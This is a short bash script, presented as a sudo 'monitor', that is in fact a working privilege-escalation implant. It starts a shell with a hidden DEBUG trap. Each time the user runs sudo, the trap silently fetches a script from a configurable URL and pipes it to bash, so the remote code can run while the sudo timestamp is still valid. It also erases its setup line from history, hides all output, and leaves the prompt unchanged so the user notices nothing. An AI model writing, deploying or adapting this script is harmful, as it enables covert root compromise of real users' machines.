#!/bin/bash
# 🔐 sudo_timestamp_hijacking.sh - Sudo Timestamp Hijacking | Invisible privilege escalation monitor

# Made By Aryan Giri | giriaryan694-a11y

set -euo pipefail

ALARM_ENDPOINT="${ALARM_URL:-http://127.0.0.1:8000/exec.sh}"

# Create init script for child shell (single-quoted heredoc = no premature expansion)
INIT_FILE=$(mktemp -t .sudo_watch.XXXXXX)
trap 'rm -f "$INIT_FILE"' EXIT

cat > "$INIT_FILE" << 'EOF'
__sudo_watch__() {
    local cmd="$BASH_COMMAND"
    # Match sudo as first command token (handles leading whitespace)
    if [[ "$cmd" =~ ^[[:space:]]*sudo([[:space:]]|$) ]]; then
        # Async, non-blocking alarm trigger + error suppression
        # FIX: disown + redirect stdin from /dev/null + nohup to prevent SIGTSTP
        ( nohup bash -c 'curl -s --connect-timeout 2 --max-time 5 "ALARM_PLACEHOLDER" 2>/dev/null | bash' < /dev/null &>/dev/null & )
        disown &>/dev/null || true
        # Optional: silent local audit (comment out for pure stealth)
        # printf "%s\t%s\n" "$(date +%s)" "$cmd" >> "${HOME}/.cache/.watch" 2>/dev/null || true
    fi
    return 0  # Never interfere with command execution
}
trap '__sudo_watch__' DEBUG
# Remove our setup line from history
history -d $((HISTCMD-1)) 2>/dev/null || true
# ⚠️ NO PS1 modification = completely silent prompt
EOF

# Inject the actual alarm endpoint (safe sed replacement)
sed -i "s|ALARM_PLACEHOLDER|${ALARM_ENDPOINT}|g" "$INIT_FILE"
chmod 600 "$INIT_FILE"

# Spawn monitored shell (no banner, no hints)
exec bash --init-file "$INIT_FILE" -i
